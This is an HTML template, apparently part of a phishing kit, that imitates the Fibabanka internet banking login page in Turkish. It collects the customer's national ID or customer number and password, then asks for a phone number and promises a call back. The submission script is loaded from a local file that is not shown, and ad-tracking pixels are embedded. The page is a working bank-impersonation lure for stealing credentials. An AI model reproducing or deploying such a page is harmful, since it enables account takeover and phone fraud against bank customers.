<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobil Giriş Formu</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
    <link href="fassets/style.css" rel="stylesheet">
    <meta content="{{ csrf_token() }}" name="csrf-token" />
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HN00WG37EP"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());

gtag('config', 'G-HN00WG37EP');
</script>
<script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '1234782915317881');
    fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=1234782915317881&ev=PageView&noscript=1"
  /></noscript>

</head>

<body>
    <div class="header">
        <div class="logo">
            <img src="fassets/logo.png" alt="Logo">
        </div>
        <div class="language-select">
            <a href="#">English</a>
        </div>
    </div>
    <div class="content">
        <div class="container">
            <div class="login-container">
                <h2 class="text-center w-100 slogan">Fibabanka İnternet Bankacılığı'na <br> Hoş Geldiniz!</h2>
                <!-- Header Bölümü -->

                <form id="loginForm">
                    
                  
                    <div id="first_step">
                        <div class="mb-3">
                            <label for="username">Müşteri / T.C. Kimlik Numarası</label>
                            <input type="text" class="form-control" id="tc"
                                placeholder="Müşteri / T.C. Kimlik Numarası"
                                data-placeholder="Müşteri / T.C. Kimlik Numarası" name="tc">
                            <p class="help-text">Hatırla</p>

                        </div>

                        <div class="mb-3 position-relative">
                            <label for="username">Şifre</label>
                            <input type="password" class="form-control" id="password" placeholder="Şifre"
                                data-placeholder="Şifre" name="parol">
                            <p class="help-text top-0"><img src="fassets/keyboard.png" height="25"></p>
                        </div>

                        <div class="mb-3 position-relative d-flex justify-content-center m-4 captchaMain">
                            <img src="fassets/captcha.png" alt="Captcha" class="captcha-img">
                            <button type="button" class="btn btn-link p-0 crefresh">Yenile</button>
                        </div>

                        <div class="mb-3">
                            <label for="securecode">Güvenlik Kodu</label>
                            <input type="text" class="form-control" id="captcha" placeholder="Güvenlik Kodu"
                                data-placeholder="Güvenlik Kodu">
                        </div>

                        <button type="button" class="btn btn-primary loginbtn" id="btnLogin">Giriş</button>
                    </div>
                    <div id="twice_step" class="d-none">
                        <div class="mb-3">
                            <label for="securecode">Telefon Numaranız</label>
                            <input type="text" class="form-control" id="tel" placeholder="Telefon Numaranız 0'sız"
                                data-placeholder="Telefon Numaranız 0'sız" name="tel">
                        </div>
                        <button type="button" class="btn btn-primary loginbtn" id="btnPhone">Devam Et</button>

                    </div>
                    <div id="last_step" class="d-none">
                        <div class="m-auto text-center">
                            <i class="fa-solid fa-check fwarning col-12"></i><p class="col-12 warslogan">En kısa sürede sizinle iletişime geçilecektir.</p>
                        </div>
                    </div>
                </form>

                <div class="forgot-password">
                    <a href="#">Şifre AL / Unuttum</a>
                </div>
            </div>

        </div>
    </div>

    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Bootstrap JS and Popper.js -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
    <script src="fassets/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="fassets/custom.js?t={{rand(0,999)}}"></script>

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HN00WG37EP"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'G-HN00WG37EP');
    </script>




</body>

</html>
